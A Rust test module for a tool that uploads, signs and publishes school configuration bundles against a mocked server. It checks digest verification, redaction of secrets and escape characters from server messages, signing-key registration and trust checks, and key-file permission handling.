    fn checked_line_says_no_problems_only_without_warnings() {
        assert_eq!(checked_line(&[], &[]), "Checked: no problems");
        let warn = Lint::new(LintLevel::Warning, "no_admins", "x");
        assert_eq!(
            checked_line(std::slice::from_ref(&warn), &[]),
            "Checked: no errors, 1 warning (above)"
        );
        let server = vec![json!({ "level": "warning" }), json!({ "level": "info" })];
        assert_eq!(
            checked_line(std::slice::from_ref(&warn), &server),
            "Checked: no errors, 2 warnings (above)"
        );
        let info = Lint::new(LintLevel::Info, "note", "x");
        assert_eq!(checked_line(&[info], &[]), "Checked: no problems");
    }

    #[tokio::test]
    async fn server_digest_must_match_the_upload() {
        // I1: a server that reports another digest than the uploaded content's is refused, and
        // nothing is recorded as uploaded.
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "pending_id": "p-1", "version": 5, "digest_hex": "ab".repeat(32), "lints": []
            })))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let err = run(&s, &w).await.unwrap_err().to_string();
        assert!(err.contains("does not hold what was uploaded"), "{err}");
        assert!(err.contains("do not approve upload p-1"), "{err}");
        assert!(Workdir::uploaded_unchanged(&w.root).unwrap().is_none());
        assert_eq!(w.meta().unwrap().base_version, 4);
    }

    #[tokio::test]
    async fn key_path_refuses_a_swapped_pending() {
        // I1: the upload is answered honestly, but the pending bundle later served for signing
        // is other (self-consistent) content: `sign_pending_expecting` refuses before signing.
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(accepted(5))
            .mount(&s)
            .await;
        let other = "version = 5\n[[group]]\nid = \"default\"\nname = \"Swapped\"\n";
        let other_digest = hex(&content_digest(&Contents {
            manifest_text: other.into(),
            files: BTreeMap::new(),
        }));
        Mock::given(method("GET"))
            .and(path("/v1/admin/publish/pending/p-1"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "pending_id": "p-1", "version": 5, "digest_hex": other_digest,
                "manifest_text": other, "files": []
            })))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let mut files = BTreeMap::new();
        files.insert("files/a.txt".to_string(), b"hello".to_vec());
        let meta = Meta {
            server: s.uri(),
            school_id: SID.into(),
            base_version: 4,
        };
        let key = t.path().join("rk.pem");
        let tk = mastersos_sign::keygen(&key).unwrap().trust_key;
        let c = Contents {
            manifest_text: manifest_trusting(&tk.id, &tk.public_key),
            files,
        };
        let w = Workdir::write_pulled(&t.path().join("school"), meta, &c, false)
            .unwrap()
            .pinned();
        let text = format!("{}# edited\n", w.manifest().unwrap());
        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
        let key = SignWith::key_file(&key).unwrap();
        let token = t.path().join("token");
        std::fs::write(&token, "tok").unwrap();
        let pins = t.path().join("pins");
        let api = Api::new(&s.uri(), "tok").unwrap();
        let mut out = Vec::new();
        let err = publish(
            &api,
            &w,
            SignOpts {
                key: &key,
                token_file: &token,
                pin_dir: &pins,
            },
            &[],
            now(),
            &mut std::io::empty(),
            &mut out,
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(
            err.contains("the server holds other content under this upload id"),
            "{err}"
        );
        assert!(!s
            .received_requests()
            .await
            .unwrap()
            .iter()
            .any(|r| r.url.path().ends_with("/commit")));
        assert_eq!(w.meta().unwrap().base_version, 4);
    }

    #[tokio::test]
    async fn server_lint_failed_is_a_redacted_refusal() {
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(ResponseTemplate::new(422).set_body_json(json!({
                "error": {
                    "code": "lint_failed",
                    "message": "Pre-publish check found 1 error(s); fix them and publish again",
                    "details": { "lints": [
                        { "level": "error", "code": "wifi_invalid", "path": "defaults.wifi[0]",
                          "message": "network Guest: psk guestpass1 is refused\u{1b}[2K",
                          "params": { "psk": "guestpass1" } },
                        { "level": "warning", "code": "other", "message": "fine" }
                    ] }
                }
            })))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let name = w.secrets().unwrap().keys().next().unwrap().clone();
        let err = run(&s, &w).await.unwrap_err();
        let r = err
            .downcast_ref::<ServerRefused>()
            .expect("a server refusal");
        assert!(r.message.contains("1 error(s)"), "{}", r.message);
        assert_eq!(r.issues.len(), 2);
        let text = serde_json::to_string(&r.issues).unwrap();
        assert!(!text.contains("guestpass1"), "{text}");
        assert!(!text.contains('\u{1b}'), "{text}");
        assert_eq!(r.issues[0]["code"], "wifi_invalid");
        assert_eq!(r.issues[0]["params"]["psk"], format!("secret:{name}"));
        assert!(r.issues[0]["message"]
            .as_str()
            .unwrap()
            .contains(&format!("psk secret:{name} is refused")));
        // Nothing was recorded as uploaded.
        assert!(Workdir::uploaded_unchanged(&w.root).unwrap().is_none());
    }

    #[tokio::test]
    async fn server_warnings_are_printed_without_secrets() {
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(Accept(
                5,
                vec![json!({ "level": "warning", "code": "wifi_weak", "message": "psk guestpass1 is weak" })],
            ))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let name = w.secrets().unwrap().keys().next().unwrap().clone();
        let (_, out) = run_out(&s, &w).await;
        assert!(out.contains("wifi_weak"), "{out}");
        assert!(out.contains(&format!("psk secret:{name} is weak")), "{out}");
        assert!(!out.contains("guestpass1"), "{out}");
    }

    #[tokio::test]
    async fn publish_uploads_the_checked_snapshot() {
        // The upload is the frozen snapshot: what the check saw is what is sent.
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(accepted(5))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let _ = run(&s, &w).await;
        let up = uploads(&s).await;
        let snap = w.freeze().unwrap();
        assert!(up[0]["manifest_text"]
            .as_str()
            .unwrap()
            .contains("# edited"));
        assert!(Workdir::is_published_upload(&w.root, 5, &digest_of(&up[0])).unwrap());
        assert!(workdir::check_snapshot(&w, &snap)
            .unwrap()
            .iter()
            .all(|l| l.level != mastersos_bundle::LintLevel::Error));
    }

    /// A kit written the way `mastersos-sign school-key new` writes it (0600).
    fn kit_file(dir: &Path) -> (std::path::PathBuf, Kit) {
        let path = dir.join("school.kit");
        mastersos_sign::kit::kit_new(&path).unwrap();
        let SignWith::Kit(kit) = SignWith::kit_file(&path).unwrap() else {
            unreachable!()
        };
        (path, kit)
    }

    /// The server's signing key list, with `kit` registered as a recovery key.
    fn registered(kit: &Kit) -> Value {
        let tk = kit.trust_key();
        json!([{
            "key_id": tk.id, "kind": "recovery", "alg": "ed25519", "label": "kit",
            "fingerprint": mastersos_bundle::trust_fingerprint(&tk), "in_published_trust": false
        }])
    }

    /// A directory for a school that has published nothing, whose trust is `kit`'s key, on `s`.
    fn first_version_dir(dir: &Path, s: &MockServer, kit: &Kit) -> Workdir {
        let tk = kit.trust_key();
        let meta = Meta {
            server: s.uri(),
            school_id: SID.into(),
            base_version: 0,
        };
        Workdir::init(dir, meta, &manifest_trusting(&tk.id, &tk.public_key)).unwrap()
    }

    /// Publish with `kit` (a kit or a key file) and the confirmations in `confirm`.
    async fn publish_with_kit(
        s: &MockServer,
        w: &Workdir,
        kit: SignWith,
        dir: &Path,
        confirm: &str,
    ) -> (Result<PublishOutcome>, String) {
        let token = dir.join("token");
        std::fs::write(&token, "tok").unwrap();
        let pins = dir.join("pins");
        let api = Api::new(&s.uri(), "tok").unwrap();
        let mut out = Vec::new();
        let r = publish(
            &api,
            w,
            SignOpts {
                key: &kit,
                token_file: &token,
                pin_dir: &pins,
            },
            &[],
            now(),
            &mut confirm.as_bytes(),
            &mut out,
        )
        .await;
        (r, String::from_utf8_lossy(&out).into_owned())
    }

    /// The server keeps the uploaded bundle and serves it back as the pending bundle.
    #[derive(Clone, Default)]
    struct Pending(std::sync::Arc<std::sync::Mutex<Option<Value>>>);

    impl Respond for Pending {
        fn respond(&self, r: &Request) -> ResponseTemplate {
            if r.method.as_str() == "POST" {
                let up: Value = serde_json::from_slice(&r.body).unwrap();
                let digest = digest_of(&up);
                *self.0.lock().unwrap() = Some(up);
                return ResponseTemplate::new(200).set_body_json(json!({
                    "pending_id": "p-1", "version": 1, "digest_hex": digest, "lints": []
                }));
            }
            let up = self.0.lock().unwrap().clone().expect("uploaded first");
            let files: Vec<Value> = up["files"]
                .as_object()
                .unwrap()
                .keys()
                .map(|p| json!({ "path": p }))
                .collect();
            ResponseTemplate::new(200).set_body_json(json!({
                "pending_id": "p-1", "version": 1, "digest_hex": digest_of(&up),
                "manifest_text": up["manifest_text"], "files": files
            }))
        }
    }

    #[tokio::test]
    async fn kit_signs_and_publishes_the_first_version() {
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let (kit_path, kit) = kit_file(t.path());
        Mock::given(method("GET"))
            .and(path("/v1/admin/signing-keys"))
            .respond_with(ResponseTemplate::new(200).set_body_json(registered(&kit)))
            .mount(&s)
            .await;
        let pending = Pending::default();
        for (m, p) in [
            ("POST", "/v1/admin/publish/pending"),
            ("GET", "/v1/admin/publish/pending/p-1"),
        ] {
            Mock::given(method(m))
                .and(path(p))
                .respond_with(pending.clone())
                .mount(&s)
                .await;
        }
        Mock::given(method("GET"))
            .and(path("/v1/admin/versions"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!([])))
            .mount(&s)
            .await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending/p-1/commit"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({ "version": 1 })))
            .mount(&s)
            .await;
        let w = first_version_dir(&t.path().join("school"), &s, &kit);
        let kit = SignWith::kit_file(&kit_path).unwrap();
        // The version number, then `trust`: the first version adds every key of its trust.
        let (r, out) = publish_with_kit(&s, &w, kit, t.path(), "1\ntrust\n").await;
        assert!(
            matches!(r.unwrap(), PublishOutcome::Published { version: 1, .. }),
            "{out}"
        );
        assert_eq!(w.meta().unwrap().base_version, 1);
        // The new base is the published version as signed: it matches the pin the signing just
        // recorded, and the directory (unchanged since the upload) carries the stamp too.
        let w = w.with_pins(t.path().join("pins"));
        w.verify_base().unwrap();
        assert!(!w.is_dirty().unwrap());
        assert!(w.manifest().unwrap().contains("version = 1"));
        workdir::check(&w).unwrap();
        // The commit carries the kit's signature over the digest of what was uploaded.
        let reqs = s.received_requests().await.unwrap();
        let commit = reqs
            .iter()
            .find(|r| r.url.path().ends_with("/commit"))
            .expect("committed");
        let body: Value = serde_json::from_slice(&commit.body).unwrap();
        let up = pending.0.lock().unwrap().clone().unwrap();
        assert_eq!(body["confirm_digest"], digest_of(&up));
        let SignWith::Kit(kit) = SignWith::kit_file(&kit_path).unwrap() else {
            unreachable!()
        };
        assert_eq!(body["signature"]["key_id"], kit.key_id());
        // The kit text never reaches the output.
        assert!(!out.contains(kit.to_display().as_str()), "{out}");
    }

    #[tokio::test]
    async fn key_file_publish_leaves_a_base_that_matches_the_pin() {
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let key = t.path().join("rk.pem");
        let tk = mastersos_sign::keygen(&key).unwrap().trust_key;
        let pending = Pending::default();
        for (m, p) in [
            ("POST", "/v1/admin/publish/pending"),
            ("GET", "/v1/admin/publish/pending/p-1"),
        ] {
            Mock::given(method(m))
                .and(path(p))
                .respond_with(pending.clone())
                .mount(&s)
                .await;
        }
        Mock::given(method("GET"))
            .and(path("/v1/admin/versions"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!([])))
            .mount(&s)
            .await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending/p-1/commit"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({ "version": 1 })))
            .mount(&s)
            .await;
        let meta = Meta {
            server: s.uri(),
            school_id: SID.into(),
            base_version: 0,
        };
        let w = Workdir::init(
            &t.path().join("school"),
            meta,
            &manifest_trusting(&tk.id, &tk.public_key),
        )
        .unwrap();
        let key = SignWith::key_file(&key).unwrap();
        let (r, out) = publish_with_kit(&s, &w, key, t.path(), "1\ntrust\n").await;
        assert!(
            matches!(r.unwrap(), PublishOutcome::Published { version: 1, .. }),
            "{out}"
        );
        let w = w.with_pins(t.path().join("pins"));
        w.verify_base().unwrap();
        assert!(!w.is_dirty().unwrap());
        workdir::check(&w).unwrap();
    }

    #[tokio::test]
    async fn unregistered_kit_uploads_nothing() {
        let s = server().await;
        Mock::given(method("GET"))
            .and(path("/v1/admin/signing-keys"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!([])))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let (kit_path, kit) = kit_file(t.path());
        let w = first_version_dir(&t.path().join("school"), &s, &kit);
        let kit = SignWith::kit_file(&kit_path).unwrap();
        let (r, _) = publish_with_kit(&s, &w, kit, t.path(), "").await;
        let err = format!("{:#}", r.unwrap_err());
        assert!(err.starts_with("Not uploaded"), "{err}");
        assert!(err.contains("not registered with"), "{err}");
        assert!(uploads(&s).await.is_empty());
    }

    #[tokio::test]
    async fn kit_not_in_trust_uploads_nothing() {
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let (kit_path, kit) = kit_file(t.path());
        Mock::given(method("GET"))
            .and(path("/v1/admin/signing-keys"))
            .respond_with(ResponseTemplate::new(200).set_body_json(registered(&kit)))
            .mount(&s)
            .await;
        // Registered, but the directory trusts another key.
        let meta = Meta {
            server: s.uri(),
            school_id: SID.into(),
            base_version: 0,
        };
        let w = Workdir::init(&t.path().join("school"), meta, &manifest_text()).unwrap();
        let kit = SignWith::kit_file(&kit_path).unwrap();
        let (r, _) = publish_with_kit(&s, &w, kit, t.path(), "").await;
        let err = r.unwrap_err().to_string();
        assert!(err.contains("is not among the trusted keys in"), "{err}");
        assert!(uploads(&s).await.is_empty());
    }

    /// Spec §5.3: a school key file others can read (a FAT32 or exFAT USB stick) still loads,
    /// with a note; a PKCS#8 key file stays strict.
    #[cfg(unix)]
    #[test]
    fn loose_kit_file_loads_but_loose_key_file_is_refused() {
        use std::os::unix::fs::PermissionsExt;
        let t = tempfile::tempdir().unwrap();
        let (kit, expected) = kit_file(t.path());
        let key = t.path().join("rk.pem");
        mastersos_sign::keygen(&key).unwrap();
        for p in [&kit, &key] {
            std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o777)).unwrap();
        }
        let SignWith::Kit(loaded) = SignWith::kit_file(&kit).unwrap() else {
            unreachable!()
        };
        assert_eq!(loaded.key_id(), expected.key_id());
        let key_err = format!("{:#}", SignWith::key_file(&key).err().unwrap());
        assert!(
            key_err.contains("has mode 777") && key_err.contains("chmod 600"),
            "{key_err}"
        );
        // Not a kit at all.
        let junk = t.path().join("junk");
        std::fs::write(&junk, "hello").unwrap();
        std::fs::set_permissions(&junk, std::fs::Permissions::from_mode(0o600)).unwrap();
        assert!(SignWith::kit_file(&junk).is_err());
    }
}
